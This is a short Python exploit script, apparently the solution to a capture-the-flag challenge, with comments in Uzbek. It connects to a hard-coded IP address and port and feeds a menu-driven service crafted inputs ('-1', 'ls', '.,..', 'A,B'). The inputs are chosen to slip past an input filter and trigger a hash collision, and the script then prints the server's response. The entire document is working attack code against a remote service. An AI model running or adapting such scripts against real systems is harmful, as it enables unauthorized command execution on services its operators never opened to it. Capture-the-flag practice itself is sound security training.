import socket
import time

def solve():
    host = '154.57.164.68'
    port = 31363

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)

    try:
        print(f"[+] Serverga ulanmoqda...")
        s.connect((host, port))

        def send_option(choice, data):
            time.sleep(0.5)
            # Menyuni tozalash (o'qib olish)
            try:
                s.recv(2048)
            except:
                pass
            s.sendall(f"{choice}\n".encode())
            time.sleep(0.5)
            s.sendall(f"{data}\n".encode())
            print(f"[+] Option {choice} -> {data}")

        # 1. Mode: -1 (Hash kolliziyasi uchun asos)
        send_option("1", "-1")

        # 2. Bin: "ls" (Ruxsat berilgan: faqat harflar)
        send_option("2", "ls")

        # 3. Arguments: ".,.." (Joriy papka va bitta yuqori papka)
        # Bular mavjud bo'lgani uchun xato bermasligi mumkin (returncode 0)
        send_option("3", ".,..")

        # 4. Switches: "a,b"
        # ls a va ls b buyruqlari ishga tushadi. 
        # Agar 'a' va 'b' degan papkalar yo'q bo'lsa, ls xato qaytaradi.
        # Bizga ikki xil returncode kerak.
        # Diqqat: check_values funksiyasi bo'sh joyni ruxsat bermaydi!
        # Shuning uchun switches qismiga ham faqat harf beramiz.
        send_option("4", "A,B") 

        # 5. Beat the competitor!
        print("[!] Hash collision trigger qilinmoqda...")
        time.sleep(0.5)
        s.sendall(b"5\n")

        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        
        print("\n" + "="*40)
        print("SERVER JAVOBI:")
        print(response.strip())
        print("="*40)

    except Exception as e:
        print(f"[X] Xatolik: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
